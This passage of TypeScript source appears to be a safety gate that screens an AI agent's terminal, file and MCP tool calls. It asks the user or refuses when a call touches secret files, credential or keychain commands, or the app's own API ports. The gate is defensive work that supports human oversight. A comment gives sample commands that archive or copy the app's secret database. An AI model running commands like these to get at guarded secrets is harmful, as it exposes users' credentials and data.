 * text the person already saw the fuller one.
 *
 * Never splits a surrogate pair (re-review N2): a non-BMP character (an
 * emoji, …) straddling `maxLength` would otherwise leave a lone high
 * surrogate as the cut text's last unit — not a crash (`JSON.stringify`
 * escapes it, `Buffer.from(…, 'utf8')` doesn't throw) but a garbled glyph
 * right where `truncated`/`hiddenChars` already disclose a cut happened, so
 * the cut backs off one code unit when it would land between the two
 * halves of a pair — the whole character moves to the hidden side instead.
 */
export function capSummary(text: string, maxLength: number): CappedSummary {
  if (text.length <= maxLength) {
    return { text, truncated: false, hiddenChars: 0 }
  }
  // A high surrogate (0xD800–0xDBFF) immediately before the cut means its
  // low surrogate is the very next unit, past the cut: keep the pair
  // together on the hidden side rather than splitting it.
  const cut =
    maxLength > 0 &&
    text.charCodeAt(maxLength - 1) >= 0xd800 &&
    text.charCodeAt(maxLength - 1) <= 0xdbff
      ? maxLength - 1
      : maxLength
  return {
    text: text.slice(0, cut),
    truncated: true,
    hiddenChars: text.length - cut
  }
}

/** The short, model-facing form of a summary: `MODEL_SUMMARY_MAX` characters,
 *  with a trailing `…` when it was cut — the model's only signal that there
 *  was more, since it gets no `truncated` / `hiddenChars` fields. */
function forModel(summary: string): string {
  const capped = capSummary(summary, MODEL_SUMMARY_MAX)
  return capped.truncated ? `${capped.text}…` : capped.text
}

async function matchCommand(
  command: string,
  cwdArg: string | null,
  roots: Roots,
  env: MatchEnv,
  workspaceDir: string | undefined
): Promise<SensitiveTarget | null> {
  const refusedMention =
    REFUSED_MENTION.exec(command)?.[0] ??
    (EXODUS_MENTION.test(command)
      ? LOCK_OR_TLS_WORD.exec(command)?.[0].trim()
      : undefined)
  if (refusedMention) {
    return { kind: 'refuse', summary: withTrigger(refusedMention, command) }
  }

  const cwd = cwdArg
    ? resolve(expandHome(cwdArg, env.home))
    : (workspaceDir ?? env.home)

  // Every word that could be a path, resolved as the shell would from `cwd`.
  // A path is the most telling trigger, so it is looked for first.
  let pathTrigger: string | null = null
  const tokens = command
    .split(/[\s'"`;|&<>(),=]+/u)
    .slice(0, MAX_COMMAND_TOKENS)
  const candidates = tokens
    .filter((t) => t && !t.startsWith('-') && !t.includes('://'))
    .map((t) => resolve(cwd, expandHome(t, env.home)))
  // Resolved together (one shared deadline), judged in order.
  const hits = await Promise.all(
    candidates.map((abs) => classifyPath(abs, roots, env))
  )
  for (const [i, abs] of candidates.entries()) {
    if (GLOB_CHARS.test(abs)) {
      const refusedRoot = roots.refused.find((r) => globReaches(abs, r, env))
      if (refusedRoot) {
        return {
          kind: 'refuse',
          summary: withTrigger(display(abs, env), command)
        }
      }
      // `~/.exo*` is all of ~/.exodus; `~/.exodus/workspace/*` is not.
      const reachesSecret =
        roots.secret.some((r) => globReaches(abs, r, env)) ||
        roots.exodusHome.some(
          (r) =>
            globReaches(abs, r, env) &&
            canon(abs, env).split(sep).length ===
              canon(r, env).split(sep).length
        )
      if (reachesSecret && !pathTrigger) pathTrigger = display(abs, env)
    }
    const hit = hits[i]
    if (hit?.kind === 'refuse') {
      return {
        kind: 'refuse',
        summary: withTrigger(display(abs, env), command)
      }
    }
    // `tar c ~/.exodus`, `cp -r ~/.exodus …`: all of it holds the database.
    const wholeExodus =
      !hit && roots.exodusHome.some((r) => canon(abs, env) === canon(r, env))
    if ((hit || wholeExodus) && !pathTrigger) pathTrigger = display(abs, env)
  }

  const trigger =
    pathTrigger ??
    tokens.find((t) => BARE_EXODUS_WORD.test(t)) ??
    SECRET_MENTION.exec(command)?.[0].replace(/^[\s'"=:(/`]/u, '') ??
    KEYCHAIN_COMMAND.exec(command)?.[0] ??
    CREDENTIAL_COMMAND.exec(command)?.[0] ??
    processArgsTrigger(command) ??
    ((await classifyPath(cwd, roots, env)) ? display(cwd, env) : null)
  return trigger
    ? { kind: 'ask', summary: withTrigger(trigger, command) }
    : null
}

// ── call_mcp_tool ────────────────────────────────────────────────────────────

/** String leaves of `arguments` checked per call; more than this asks. */
const MAX_MCP_LEAVES = 500
const TOO_MANY_LEAVES = Symbol('too-many-leaves')

/**
 * A URL (or `host:port`) at one of the ports Actovia's own API listens on —
 * leading zeros included: WHATWG `new URL` reads `:060223` as 60223 and the
 * request reaches the API (re-review m2).
 */
const OWN_API_PORTS = new Set([SERVER_PORT, LAN_SERVER_PORT])
const OWN_API_PORT = new RegExp(
  `:0*(?:${SERVER_PORT}|${LAN_SERVER_PORT})(?!\\d)`,
  'u'
)

/** Whether a string leaf names Actovia's own API port. */
function leafAtOwnApi(leaf: string): boolean {
  const trimmed = leaf.trim()
  if (OWN_API_PORT.test(trimmed)) return true
  // `{ host: '127.0.0.1', port: '60223' }`: the port on its own.
  if (/^\d{1,10}$/u.test(trimmed) && OWN_API_PORTS.has(Number(trimmed))) {
    return true
  }
  if (/^[a-z][a-z\d+.-]*:\/\//iu.test(trimmed)) {
    try {
      const { port } = new URL(trimmed)
      if (port && OWN_API_PORTS.has(Number(port))) return true
    } catch {
      // Not a URL after all: the regex above has had its look.
    }
  }
  return false
}

/** Whether any number in `value` is one of the API's ports (`{ port: 60223 }`). */
function holdsOwnApiPortNumber(value: unknown, depth = 0): boolean {
  if (typeof value === 'number') return OWN_API_PORTS.has(value)
  if (!value || typeof value !== 'object' || depth > 32) return false
  const children = Array.isArray(value) ? value : Object.values(value)
  return children.some((child) => holdsOwnApiPortNumber(child, depth + 1))
}

function stringLeaves(
  value: unknown,
  out: string[],
  depth = 0
): typeof TOO_MANY_LEAVES | void {
  if (typeof value === 'string') {
    if (value.trim() !== '') out.push(value)
    return out.length > MAX_MCP_LEAVES ? TOO_MANY_LEAVES : undefined
  }
  if (!value || typeof value !== 'object' || depth > 32) return undefined
  const children = Array.isArray(value) ? value : Object.values(value)
  for (const child of children) {
    if (stringLeaves(child, out, depth + 1) === TOO_MANY_LEAVES) {
      return TOO_MANY_LEAVES
    }
  }
  return undefined
}

/** A leaf as a filesystem path, when it reads as one (`/…`, `~…`, `file://…`). */
function leafAsPath(leaf: string, home: string): string | null {
  const trimmed = leaf.trim()
  if (/^file:\/\//iu.test(trimmed)) {
    try {
      return fileURLToPath(trimmed)
    } catch {
      return null
    }
  }
  const expanded = expandHome(trimmed, home)
  return isAbsolute(expanded) ? resolve(expanded) : null
}

/**
 * `call_mcp_tool`: an MCP server can read files, run commands or fetch URLs
 * the gate never sees. Every string leaf of `arguments` is checked — as a
 * whole path (a recursive read, since a server may walk a directory), with
 * the terminal heuristic (paths and credential commands inside it), and for a
 * URL at Actovia's own API ports, which is refused. The summary names the
 * server and tool, then what matched.
 */
async function matchMcpCall(
  args: unknown,
  roots: Roots,
  env: MatchEnv,
  workspaceDir: string | undefined
): Promise<SensitiveTarget | null> {
  const server = stringArg(args, 'server') ?? '?'
  const tool = stringArg(args, 'tool') ?? '?'
  const label = `${server}/${tool}`
  const inner =
    args && typeof args === 'object'
      ? (args as Record<string, unknown>).arguments
      : undefined
  const leaves: string[] = []
  if (stringLeaves(inner, leaves) === TOO_MANY_LEAVES) {
    return { kind: 'ask', summary: `${label}: too many arguments to check` }
  }
  if (holdsOwnApiPortNumber(inner)) {
    return {
      kind: 'refuse',
      summary: `${label}: Actovia's own API — port ${SERVER_PORT} / ${LAN_SERVER_PORT}`
    }
  }
  const hits: SensitiveTarget[] = []
  for (const leaf of leaves) {
    if (leafAtOwnApi(leaf)) {
      return {
        kind: 'refuse',
        summary: `${label}: Actovia's own API — ${commandText(leaf)}`
      }
    }
    const path = leafAsPath(leaf, env.home)
    const pathHit = path
      ? await classifyPath(path, roots, env, { recursive: true })
      : null
    if (pathHit && path) {
      hits.push({
        kind: pathHit.kind,
        summary: `${label}: ${display(path, env)}`
      })
      continue
    }
    const hit = await matchCommand(leaf, null, roots, env, workspaceDir)
    if (hit) hits.push({ kind: hit.kind, summary: `${label}: ${hit.summary}` })
  }
  return strongest(hits)
}

/**
 * `sensitiveTarget()`'s result: `SensitiveTarget` plus whether `summary` was
 * cut at `EVENT_SUMMARY_MAX` and, when it was, how many sanitized characters
 * that cost — the `approval_required` event's `truncated` / `hiddenChars`.
 */
export interface ApprovalTarget extends SensitiveTarget {
  truncated: boolean
  hiddenChars: number
}

/**
 * Whether a tool call touches a secret outside Actovia (`ask`), one of
 * Actovia's own that is never handed out (`refuse`), or neither (null).
 * `workspaceDir` is the chat's workspace: secret-named files inside it are
 * the model's own and pass. Pure apart from `realpath` on the paths it is
 * given; `env` is for tests.
 */
export async function sensitiveTarget(
  toolName: string,
  args: unknown,
  workspaceDir?: string,
  env: MatchEnv = defaultEnv()
): Promise<ApprovalTarget | null> {
  const isPathTool = toolName in PATH_TOOLS
  if (
    toolName !== TOOL_NAMES.callMcpTool &&
    toolName !== TOOL_NAMES.terminal &&
    !isPathTool
  ) {
    return null
  }
  const resolver = new PathResolver(env)
  try {
    const roots = await rootsOf(env, workspaceDir, resolver)
    const target = await (async (): Promise<SensitiveTarget | null> => {
      if (toolName === TOOL_NAMES.callMcpTool) {
        return await matchMcpCall(args, roots, env, workspaceDir)
      }
      if (toolName === TOOL_NAMES.terminal) {
        const command = stringArg(args, 'command')
        if (!command) return null
        return await matchCommand(
          command,
          stringArg(args, 'cwd'),
          roots,
          env,
          workspaceDir
        )
      }
      const path = stringArg(args, PATH_TOOLS[toolName]!)
      if (!path) return null
      return await matchPathTool(toolName, path, roots, env, workspaceDir)
    })()
    if (!target) return null
    // The one place every summary is sanitized before it leaves the
    // matcher (`sanitizeSummary()`), then bounded once, generously, for the
    // event and the card (`capSummary()`, I1: not the short model-facing
    // bound — that's applied separately, only to the model's copy, by
    // `declinedReason()` / `refusedReason()` / `groupRefusedReason()`).
    const capped = capSummary(
      sanitizeSummary(target.summary),
      EVENT_SUMMARY_MAX
    )
    return {
      kind: target.kind,
      summary: capped.text,
      truncated: capped.truncated,
      hiddenChars: capped.hiddenChars
    }
  } finally {
    resolver.dispose()
  }
}

/** What the model reads when the user (or the clock, or Stop) says no. */
export function declinedReason(summary: string): string {
  return `The user declined access to ${forModel(summary)}.`
}

/** What a Philharmonic Group run reads: no one can approve there. */
export function groupRefusedReason(summary: string): string {
  return `Access to ${forModel(summary)} is not available in a Group run.`
}

/** What the model reads for Actovia's own files (lock, TLS key, database,
 *  backups) and API. */
export function refusedReason(summary: string): string {
  return `Access to ${forModel(summary)} is refused: it touches Actovia's own secrets, data files or API, which tools never reach.`
}
